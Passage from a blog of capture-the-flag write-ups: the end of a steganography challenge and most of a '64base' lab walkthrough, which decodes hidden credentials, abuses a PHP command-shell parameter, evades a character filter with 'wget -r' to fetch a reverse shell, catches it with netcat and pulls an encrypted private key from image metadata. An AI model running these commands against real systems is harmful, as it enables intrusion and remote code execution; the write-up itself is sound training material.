</pre></td><td class='code'><pre><code class=''><span class='line'>Comment                         : 35:31:3a:35:33:3a:34:36:3a:35:37:3a:36:34:3a:35:38:3a:33:35:3a:37:31:3a:36:34:3a:34:35:3a:36:37:3a:36:61:3a:34:65:3a:37:61:3a:34:39:3a:33:35:3a:36:33:3a:33:30:3a:37:38:3a:34:32:3a:34:66:3a:33:32:3a:36:37:3a:33:30:3a:34:61:3a:35:31:3a:33:64:3a:33:64</span></code></pre></td></tr></table></div></figure>


<p>Had to hex-decode this 2 times to get a base64 string: <em>QSFWdX5qdEgjNzI5c0xBO2g0JQ==</em>, which I decoded to <code>A!Vu~jtH#729sLA;h4%</code>. This looks like a password, but where to use it?</p>

<p>With the hints from the description, knowing that a file will need to be downloaded, I treated mulder.fbi as a file and tried appending it to the URL path that gave me a forbidden error: <a href="http://192.168.145.141/v/81JHPbvyEQ8729161jd6aKQ0N4/mulder.fbi">http://192.168.145.141/v/81JHPbvyEQ8729161jd6aKQ0N4/mulder.fbi</a></p>

<p>That actually worked and I downloaded the file, which is apparently an MP4:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>file mulder.fbi 
</span><span class='line'>mulder.fbi: ISO Media, MP4 v2 [ISO 14496-14]</span></code></pre></td></tr></table></div></figure>


<p>This is a song by The Platters. Since I couldn&rsquo;t use steghide on a video, I googled for MP4 steganography and found this Lifehacker article about <a href="https://lifehacker.com/5771142/embed-a-truecrypt-volume-in-a-playable-video-file">embedding a TrueCrypt volume in a video</a>. I installed Veracrypt and used it to mount the file as a volume, in TrueCrypt mode. At the password prompt, I used the string that I&rsquo;ve decoded earlier, and it served me the volume, with a file called Flag.txt inside!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat Flag.txt 
</span><span class='line'>Congratulations! 
</span><span class='line'>
</span><span class='line'>You are a winner. 
</span><span class='line'>
</span><span class='line'>Please leave some feedback on your thoughts regarding this challenge� Was it fun? Was it hard enough or too easy? What did you like or dislike, what could be done better?
</span><span class='line'>
</span><span class='line'>https://www.spydersec.com/feedback</span></code></pre></td></tr></table></div></figure>


<p>The main takeaways from this challenge for me were the steganography possibilities for video files. Until next time!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ________________________________________
</span><span class='line'>/ Q: How many hardware engineers does it \
</span><span class='line'>| take to change a light bulb? A: None.  |
</span><span class='line'>| We'll fix it in software.              |
</span><span class='line'>|                                        |
</span><span class='line'>| Q: How many system programmers does it |
</span><span class='line'>| take to change a light bulb? A: None.  |
</span><span class='line'>| The application can work around it.    |
</span><span class='line'>|                                        |
</span><span class='line'>| Q: How many software engineers does it |
</span><span class='line'>| take to change a light bulb? A: None.  |
</span><span class='line'>| We'll document it in the manual.       |
</span><span class='line'>|                                        |
</span><span class='line'>| Q: How many tech writers does it take  |
</span><span class='line'>| to change a light bulb? A: None. The   |
</span><span class='line'>\ user can figure it out.                /
</span><span class='line'> ----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>


<p></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[All your 64Base are belong to us]]></title>
    <link href="http://chousensha.github.io/blog/2018/10/26/all-your-64base-are-belong-to-us/"/>
    <updated>2018-10-26T15:14:14-04:00</updated>
    <id>http://chousensha.github.io/blog/2018/10/26/all-your-64base-are-belong-to-us</id>
    <content type="html"><![CDATA[<p>This machine is based on Star Wars. The goal is &ldquo;to Beat the Empire and steal the plans for the Death Star before its too late.&rdquo;. For this to happen, 6 flags encoded in base64 need to be collected.</p>

<p><a href="https://www.youtube.com/watch?v=v8MqvUeDqL4">I AM THE EMPIRE!</a></p>

<!-- more -->




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>22/tcp    open  ssh?
</span><span class='line'>| fingerprint-strings: 
</span><span class='line'>|   GenericLines, NULL: 
</span><span class='line'>|     The programs included with the Fedora GNU/Linux system are free software;
</span><span class='line'>|     exact distribution terms for each program are described in the
</span><span class='line'>|     individual files in /usr/share/doc/*/copyright.
</span><span class='line'>|     Fedora GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>|     permitted by applicable law.
</span><span class='line'>|_    Last login: Mon Oct 24 02:04:10 4025 from 010.101.010.001
</span><span class='line'>80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
</span><span class='line'>| http-robots.txt: 429 disallowed entries (15 shown)
</span><span class='line'>| /administrator/ /admin/ /login/ /88888/ /88888888/ 
</span><span class='line'>| /88888888888/ /88888888888P/ /c3P08P/ /C3p0/ /A280/ /above/ /AC1/ 
</span><span class='line'>|_/across/ /activation/ /Adjustments/
</span><span class='line'>|_http-server-header: Apache/2.4.10 (Debian)
</span><span class='line'>|_http-title: 64base
</span><span class='line'>4899/tcp  open  radmin?
</span><span class='line'>| fingerprint-strings: 
</span><span class='line'>|   NULL: 
</span><span class='line'>|     sshhh! ssh! droids!
</span><span class='line'>|     So..
</span><span class='line'>|     found a way in then...
</span><span class='line'>|     but, can you pop root?
</span><span class='line'>|     /~\n |oo ) Did you hear that?
</span><span class='line'>|     _=/_
</span><span class='line'>|     ()\x20 //|/.\|\
</span><span class='line'>|     _|_____|_ \ _/ ||
</span><span class='line'>|     \|\x20/| ||
</span><span class='line'>|     ||__*__|| | | |
</span><span class='line'>|     ___/ ~| []|[]
</span><span class='line'>|     /=\x20/=\x20/=\x20 | | |
</span><span class='line'>|_    ________________[_]_[_]_[_]________/_]_[__________________________
</span><span class='line'>62964/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
</span><span class='line'>| ssh-hostkey: 
</span><span class='line'>|   1024 59:a5:02:ba:72:8a:2e:c1:9c:ff:cc:b2:f8:15:66:b3 (DSA)
</span><span class='line'>|   2048 2a:57:2c:75:8c:34:9f:28:84:15:07:2a:be:d0:41:98 (RSA)
</span><span class='line'>|   256 97:94:13:38:92:70:6c:3a:c0:4f:f3:f3:e7:ce:40:91 (ECDSA)
</span><span class='line'>|_  256 e0:45:24:da:a1:2d:8a:21:c8:cf:98:4b:7f:42:e7:d4 (ED25519)</span></code></pre></td></tr></table></div></figure>


<p>The first red herring is SSH on port 22. If you try connecting to it, it looks like it gives you a root shell, and then it closes the connection. There is no SSH there:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vn 192.168.145.138 22
</span><span class='line'>(UNKNOWN) [192.168.145.138] 22 (ssh) open
</span><span class='line'>The programs included with the Fedora GNU/Linux system are free software;
</span><span class='line'>the exact distribution terms for each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Fedora GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>Last login: Mon Oct 24 02:04:10 4025 from 010.101.010.001
</span><span class='line'>
</span><span class='line'>#
</span><span class='line'>id</span></code></pre></td></tr></table></div></figure>


<p>Then there is port 4899, which shows some ASCII art, but nothing seems to happen otherwise:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>You found a way in then...
</span><span class='line'>
</span><span class='line'>but, can you pop root?
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>                                           /~\
</span><span class='line'>                                          |oo )    Did you hear that?
</span><span class='line'>                                          _\=/_
</span><span class='line'>                          ___            /  _  \
</span><span class='line'>                         / ()\          //|/.\|\\
</span><span class='line'>                       _|_____|_        \\ \_/  ||
</span><span class='line'>                      | | === | |        \|\ /| ||
</span><span class='line'>                      |_|  O  |_|        # _ _/ #
</span><span class='line'>                       ||  O  ||          | | |
</span><span class='line'>                       ||__*__||          | | |
</span><span class='line'>                      |~ \___/ ~|         []|[]
</span><span class='line'>                      /=\ /=\ /=\         | | |
</span><span class='line'>      ________________[_]_[_]_[_]________/_]_[_\_________________________</span></code></pre></td></tr></table></div></figure>


<h2>Flag #1 &ndash; Decode and decode some more</h2>

<p>The web server takes us to Lord Vader&rsquo;s blog:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/64base/blog.png" title="blog" alt="vader blog"></p>

<p>You probably noticed that weird string, <em>dmlldyBzb3VyY2UgO0QK</em>. If you look in the HTML source, you will find a comment following it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!--5a6d78685a7a4637546d705361566c59546d785062464a7654587056656c464953587055616b4a56576b644752574e7151586853534842575555684b6246524551586454656b5a77596d316a4d454e6e5054313943673d3d0a--&gt;</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s hex encoded, and decoding it gives a&hellip;I&rsquo;m sure you expect it by now&hellip;base64 string:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ZmxhZzF7TmpSaVlYTmxPbFJvTXpVelFISXpUakJVWkdGRWNqQXhSSHBWUUhKbFREQXdTekZwYm1jMENnPT19Cg==</span></code></pre></td></tr></table></div></figure>


<p>Decoding this gives the 1st flag: <code>flag1{NjRiYXNlOlRoMzUzQHIzTjBUZGFEcjAxRHpVQHJlTDAwSzFpbmc0Cg==}</code>, and further decoding the flag leaves us with what look like credentials for something: <code>64base:Th353@r3N0TdaDr01DzU@reL00K1ing4</code></p>

<h2>Flag #2 &ndash; Imperial class bounty hunter</h2>

<p>If you browse the pages you can read some Star Wars centric posts. I didn&rsquo;t go through them thoroughly, but I did notice a relevant hint in a picture for something that might come up later:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/64base/hint.jpg" title="hint" alt="shell hint"></p>

<p>So..when we&rsquo;ll reach the point of getting a shell, we&rsquo;ll have to use <em>system</em> instead of <em>exec</em>. Cool..now it&rsquo;s time to look inside that massive robots.txt. There are too many entries to show and the few I&rsquo;ve tried were blank. Under <em>/admin</em> there&rsquo;s basic authentication, but the credentials from the first flag didn&rsquo;t work. Some attention to detail is required for this one. In the above picture, there is another important hint that I&rsquo;ve overlooked: <em>Only respond if you are a real Imperial-Class BountyHunter</em>. Within the plethora of robots.txt entries there is this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Disallow: /Imperial-class/</span></code></pre></td></tr></table></div></figure>


<p>Useless like the others, but the message said <em>Imperial-Class</em>..could it be that one capital letter would make the difference? I tried <a href="http://192.168.145.138/Imperial-Class/">http://192.168.145.138/Imperial-Class/</a> and another basic authentication box popped up, and this time the credentials worked!</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/64base/error.jpg" title="error" alt="error"></p>

<p>It looks like a dead end, but the source is with us:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!-- don't forget the BountyHunter login --&gt;</span></code></pre></td></tr></table></div></figure>


<p>Adding this part to the URL (<em>Imperial-Class/BountyHunter</em>) takes us to a login page:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/64base/login.jpg" title="login" alt="login"></p>

<p>The force..source to the rescue again! If you view the source, you will notice another 3 hex strings:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>5a6d78685a7a4a37595568534d474e4954545a4d65546b7a5a444e6a645756
</span><span class='line'>584f54466b53465a70576c4d31616d49794d485a6b4d6b597757544a6e4c32
</span><span class='line'>584f54466b53465a70576c4d31616d49794d485a6b4d6b597757544a6e4c32</span></code></pre></td></tr></table></div></figure>


<p>Decoding them as a block gives us another base64 string:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ZmxhZzJ7YUhSMGNITTZMeTkzZDNjdWVXOTFkSFZpWlM1amIyMHZkMkYwWTJnL2RqMTJTbmQ1ZEVaWFFUaDFRUW89fQo=</span></code></pre></td></tr></table></div></figure>


<p>And decoding this gives the second flag: <code>flag2{aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj12Snd5dEZXQTh1QQo=}</code>. But it&rsquo;s the inside that matters, and it&rsquo;s actually a <a href="https://www.youtube.com/watch?v=vJwytFWA8uA">link to Youtube</a></p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/64base/burp.png" title="burp" alt="burp"></p>

<p>So we&rsquo;ll have to use Burp for the next part.</p>

<h2>Flag #3 &ndash; Burp&#8217;ing for the empire</h2>

<p>I&rsquo;ve put some dummy values in the login form and intercepted the requests with Burp..it&rsquo;s important to also capture the server response, because the flag is in the 302 Moved Temporarily response from the server: <code>flag3{NTNjcjN0NWgzNzcvSW1wZXJpYWwtQ2xhc3MvQm91bnR5SHVudGVyL2xvZ2luLnBocD9mPWV4ZWMmYz1pZAo=}</code>. And decoding it shows the way to the secret shell that was hinted at previously: <code>53cr3t5h377/Imperial-Class/BountyHunter/login.php?f=exec&amp;c=id</code></p>

<h2>Flag #4 &ndash; System, not exec</h2>

<p>Going to <a href="http://192.168.145.138/Imperial-Class/BountyHunter/login.php?f=exec&amp;c=id">http://192.168.145.138/Imperial-Class/BountyHunter/login.php?f=exec&amp;c=id</a> takes us to a page that only has the text &ldquo;[64base Command Shell]&rdquo; displayed on it. Trying different commands for the <em>c</em> parameter doesn&rsquo;t change anything, but we have the tip from before. So I switched to <strong>?f=system&amp;c=id</strong> and got the flag and the command output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>flag4{NjRiYXNlOjY0YmFzZTVoMzc3Cg==}
</span><span class='line'>
</span><span class='line'>Debian GNU/Linux 8 \n \l
</span><span class='line'>
</span><span class='line'>Sat Oct 27 16:05:00 BST 2018
</span><span class='line'>Linux 64base 3.16.0-4-586 #1 Debian 3.16.36-1+deb8u2 (2016-10-19) i686 GNU/Linux
</span><span class='line'>          inet addr:192.168.145.138  Bcast:192.168.145.255  Mask:255.255.255.0
</span><span class='line'>          inet6 addr: fe80::20c:29ff:fe0a:a6d1/64 Scope:Link
</span><span class='line'>
</span><span class='line'>uid=1001(64base) gid=1001(64base) groups=1001(64base)</span></code></pre></td></tr></table></div></figure>


<p>Decoding the flag gives another set of possible credentials: <code>64base:64base5h377</code>. Tried them on the SSH with no success.</p>

<h2>Flag #5 &ndash; When nothing else works, recurse!</h2>

<p>Even though it looks like we have a shell, in reality, many commands don&rsquo;t work. At this point, I looked at a hint from other solutions to understand what is going on. It seems there is some filtering in place, and you can see what is being filtered by using PHP&rsquo;s <strong>var_dump</strong> function, which displays structured information (type and value) about variables. I tried downloading a reverse shell from my system with <code>?f=system&amp;c=wget <a href="http://192.168.145.133:8001/shell.php">http://192.168.145.133:8001/shell.php</a></code>, but of course it didn&rsquo;t work. However, when I tried looking at how the command is constructed with <code>?f=var_dump&amp;c=wget <a href="http://192.168.145.133:8001/shell.php">http://192.168.145.133:8001/shell.php</a></code>, I saw what was filtered out:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>string(190) "echo '
</span><span class='line'>flag4{NjRiYXNlOjY0YmFzZTVoMzc3Cg==}
</span><span class='line'>';cat.real /etc/issue;date;uname -a;/sbin/ifconfig eth0|/usr/share/grep.real inet;echo
</span><span class='line'> sudo -u 64base wget http192.168.145.1338001shell.php"</span></code></pre></td></tr></table></div></figure>


<p>The slash and colon characters are filtered out. I played with it and saw that other special characters are also filtered out, so I couldn&rsquo;t use command chaining to get rid of it. I could not point wget to my server that with the shell. But wget has the option of recursive downloading, with the <em>-r</em> switch. If I could serve the shell in the root of my web server, it should be recursively downloaded, since there would be no blacklisted characters in the command. So I used Python&rsquo;s SimpleHTTPServer to serve the shell on port 80 and tested the recursive download from my machine, and it created a directory corresponding with the one downloaded, with the shell inside:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wget -r 192.168.145.133
</span><span class='line'>--2018-10-27 10:03:58--  http://192.168.145.133/
</span><span class='line'>Connecting to 192.168.145.133:80... connected.
</span><span class='line'>HTTP request sent, awaiting response... 200 OK
</span><span class='line'>Length: 216 [text/html]
</span><span class='line'>Saving to: ‘192.168.145.133/index.html’
</span><span class='line'>
</span><span class='line'>192.168.145.133/index.html            100%[======================================================================&gt;]     216  --.-KB/s    in 0s      
</span><span class='line'>
</span><span class='line'>2018-10-27 10:03:58 (11.8 MB/s) - ‘192.168.145.133/index.html’ saved [216/216]
</span><span class='line'>
</span><span class='line'>Loading robots.txt; please ignore errors.
</span><span class='line'>--2018-10-27 10:03:58--  http://192.168.145.133/robots.txt
</span><span class='line'>Connecting to 192.168.145.133:80... connected.
</span><span class='line'>HTTP request sent, awaiting response... 404 File not found
</span><span class='line'>2018-10-27 10:03:58 ERROR 404: File not found.
</span><span class='line'>
</span><span class='line'>--2018-10-27 10:03:58--  http://192.168.145.133/shell.php
</span><span class='line'>Connecting to 192.168.145.133:80... connected.
</span><span class='line'>HTTP request sent, awaiting response... 200 OK
</span><span class='line'>Length: 5497 (5.4K) [application/octet-stream]
</span><span class='line'>Saving to: ‘192.168.145.133/shell.php’
</span><span class='line'>
</span><span class='line'>192.168.145.133/shell.php             100%[======================================================================&gt;]   5.37K  --.-KB/s    in 0s      
</span><span class='line'>
</span><span class='line'>2018-10-27 10:03:58 (638 MB/s) - ‘192.168.145.133/shell.php’ saved [5497/5497]
</span><span class='line'>
</span><span class='line'>FINISHED --2018-10-27 10:03:58--
</span><span class='line'>Total wall clock time: 0.01s
</span><span class='line'>Downloaded: 2 files, 5.6K in 0s (212 MB/s)</span></code></pre></td></tr></table></div></figure>


<p>I made the change and dumped the variable as it looks now:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sudo -u 64base wget -r 192.168.145.138</span></code></pre></td></tr></table></div></figure>


<p>Things are looking good. But when I ran it, still nothing happened, and there was no GET request downloading the shell on my Python server. After more time spent dumping variations of the command, the one that finally worked was <code>?f=system&amp;c=ls | wget -r 192.168.145.133</code></p>

<p>Now my server received a request, and when I listed the current directory:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>total 48K
</span><span class='line'>drwxr-xr-x 6 www-data www-data 4.0K Oct 27 18:12 .
</span><span class='line'>drwxr-xr-x 3 www-data www-data 4.0K Dec  6  2016 ..
</span><span class='line'>drwxr-xr-x 2 www-data www-data 4.0K Oct 27 18:12 192.168.145.133
</span><span class='line'>-rwxr-x--- 1 www-data www-data 2.1K Dec  5  2016 cat
</span><span class='line'>drwxr-xr-x 2 www-data www-data 4.0K Dec  5  2016 css
</span><span class='line'>-rwxr-x--- 1 www-data www-data  757 Dec  6  2016 index.html
</span><span class='line'>-rwxr-x--- 1 www-data www-data  705 Dec  5  2016 index.jade
</span><span class='line'>-rwxr-x--- 1 www-data www-data  959 Dec  6  2016 index.php
</span><span class='line'>drwxr-xr-x 2 www-data www-data 4.0K Dec  5  2016 js
</span><span class='line'>-rwxr-x--- 1 www-data www-data 1.1K Dec  5  2016 license.txt
</span><span class='line'>-rwxr-x--- 1 www-data www-data  835 Dec  6  2016 login.php
</span><span class='line'>drwxr-xr-x 2 www-data www-data 4.0K Dec  5  2016 scss</span></code></pre></td></tr></table></div></figure>


<p>Navigating to <a href="http://192.168.145.138/Imperial-Class/BountyHunter/192.168.145.133/shell.php">http://192.168.145.138/Imperial-Class/BountyHunter/192.168.145.133/shell.php</a> served me the shell on my listener:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vnlp 8888
</span><span class='line'>listening on [any] 8888 ...
</span><span class='line'>connect to [192.168.145.133] from (UNKNOWN) [192.168.145.138] 45307
</span><span class='line'>Linux 64base 3.16.0-4-586 #1 Debian 3.16.36-1+deb8u2 (2016-10-19) i686 GNU/Linux
</span><span class='line'> 18:44:14 up  4:27,  0 users,  load average: 0.00, 0.01, 0.05
</span><span class='line'>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span><span class='line'>/bin/sh: 0: can't access tty; job control turned off
</span><span class='line'>$ python -c 'import pty; pty.spawn("/bin/bash")'      
</span><span class='line'>www-data@64base:/$ </span></code></pre></td></tr></table></div></figure>


<p>I looked around and saw more ASCII art files, then I ran a quick search for the flag:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@64base:/$ find / -name flag* 2&gt;/dev/null
</span><span class='line'>/var/www/html/admin/S3cR37/flag5{TG9vayBJbnNpZGUhIDpECg==}</span></code></pre></td></tr></table></div></figure>


<p>And the hint for the last flag is <code>Look Inside! :D</code>.</p>

<h2>Flag #6 &ndash; Use the force</h2>

<p>Running file on the found file shows that it&rsquo;s a JPEG image:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, comment: "4c5330744c5331435255644a546942535530456755464a4a566b4655525342", baseline, precision 8, 960x720, frames 3</span></code></pre></td></tr></table></div></figure>


<p>There is hex in the comment, I decoded it to <code>LS0tLS1CRUdJTiBSU0EgUFJJVkFURSB</code>. Then I passed this through a base64 decoder and it gave me the beginning of an SSH private key:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-----BEGIN RSA PRIVATE</span></code></pre></td></tr></table></div></figure>


<p>I needed to take a better look at this, so I downloaded it to my machine:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/64base/flag.jpg" title="flag" alt="flag5"></p>

<p>And then I ran exiftool on it and the comment string was actually huge. So there must be a complete private key in there. So I went again through the hex and bas64 decoding process, to get the key:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-----BEGIN RSA PRIVATE KEY-----
</span><span class='line'>Proc-Type: 4,ENCRYPTED
</span><span class='line'>DEK-Info: AES-128-CBC,621A38AAD4E9FAA3657CA3888D9B356C
</span><span class='line'>
</span><span class='line'>mDtRxIwh40RSNAs2+lNRHvS9yhM+eaxxU5yrGPCkrbQW/RgPP+RGJBz9VrTkvYw6
</span><span class='line'>YcOuYeZMjs4fIPn7FZyJgxGHhSxQoxVn9kDkwnsMNDirtcoCOk9RDAG5ex9x4TMz
</span><span class='line'>8IlDBQq5i9Yzj9vPfzeBDZdIz9Dw2gn2SaEgu5zel+6HGObF8Zh3MIchy8s1XrE0
</span><span class='line'>kvLKI252mzWw4kbSs9+QaWyh34k8JIVzuc1QCybz5WoU5Y56G6q1Rds0bcVqLUse
